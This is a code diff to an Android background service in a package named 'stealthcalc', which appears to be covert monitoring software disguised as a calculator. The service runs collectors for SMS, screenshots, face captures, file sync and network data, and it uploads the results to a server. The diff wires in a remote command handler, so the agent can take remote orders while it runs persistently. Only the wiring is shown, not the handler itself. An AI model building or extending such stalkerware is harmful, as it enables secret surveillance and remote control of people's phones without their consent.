@@ -24,6 +24,7 @@ import com.stealthcalc.monitoring.collector.MediaChangeCollector
 import com.stealthcalc.monitoring.collector.NetworkCollector
 import com.stealthcalc.monitoring.collector.ScreenStateCollector
 import com.stealthcalc.monitoring.collector.SmsCollector
+import com.stealthcalc.monitoring.service.RemoteCommandHandler
 import com.stealthcalc.monitoring.data.MonitoringRepository
 import com.stealthcalc.monitoring.network.AgentApiClient
 import dagger.hilt.android.AndroidEntryPoint
@@ -68,6 +69,7 @@ class AgentService : LifecycleService() {
     @Inject lateinit var fileSyncCollector: FileSyncCollector
     @Inject lateinit var screenshotCollector: ScreenshotCollector
     @Inject lateinit var faceCaptureCollector: FaceCaptureCollector
+    @Inject lateinit var remoteCommandHandler: RemoteCommandHandler
     @Inject lateinit var apiClient: AgentApiClient
 
     private var collectJob: Job? = null
@@ -93,6 +95,7 @@ class AgentService : LifecycleService() {
         isRunning = true
         startCollectors()
         startUploadLoop()
+        remoteCommandHandler.startListening()
         AppLogger.log(this, "[agent]", "Agent service started")
         return START_STICKY
     }
@@ -157,6 +160,7 @@ class AgentService : LifecycleService() {
         deviceSecurityCollector.stop()
         faceCaptureCollector.stop()
         screenshotCollector.release()
+        remoteCommandHandler.stopListening()
         AppLogger.log(this, "[agent]", "Agent service stopped")
         super.onDestroy()
     }
